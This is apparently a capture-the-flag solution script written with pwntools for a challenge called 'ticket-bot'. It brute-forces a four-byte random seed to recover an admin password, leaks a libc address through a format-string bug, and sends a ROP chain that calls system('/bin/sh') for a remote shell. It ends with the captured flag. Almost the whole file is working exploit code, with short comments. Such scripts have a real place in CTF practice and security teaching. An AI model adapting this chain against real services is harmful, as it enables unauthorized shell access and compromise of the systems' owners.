from pwn import *
import subprocess

bin = './chal'

elf = context.binary = ELF(bin)
libc = elf.libc
#p = process(bin)
#gdb.attach(p, '')
#pause()

p = remote('ticket-bot.challs.csc.tf', 1337)

#Grabbing second rand value
p.recvuntil(b'ticketID ')
second_rand = int(p.recvuntil(b'\n')[:-1])
log.info(second_rand)

#Brute forcing the seed to gain the password since seed is 4 bytes
passwd = subprocess.run(['./brute', str(second_rand)], text=True, capture_output=True).stdout.strip()
log.info(passwd)

#We can now hit the admin menu
p.clean()
p.sendline(b'2')
p.sendlineafter(b'Admin Password', str(passwd).encode())
p.sendline(b'1')
p.clean()

#Leaking libc
p.sendline(b'%p')
p.recvuntil(b'Password changed to\n') #clearing junk
libc.address = int(p.recvuntil(b'=')[:-1], 16) - 0x1ed723
log.info(hex(libc.address))

p.clean()
p.sendline(b'2')
p.sendlineafter(b'Admin Password', b'0')
p.sendline(b'1')
p.clean()

#Now we'll rop to a shell
rop = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
binsh = next(libc.search(b'/bin/sh\x00'))

payload = cyclic(16) + p64(pop_rdi+1) + p64(pop_rdi) + p64(binsh) + p64(libc.sym['system'])
p.sendline(payload)
p.interactive()
p.close()

#CSCTF{r4nd_funk7i0n_i5_n0t_s0_r4nd0m3_a5_y0u_th0ugh7}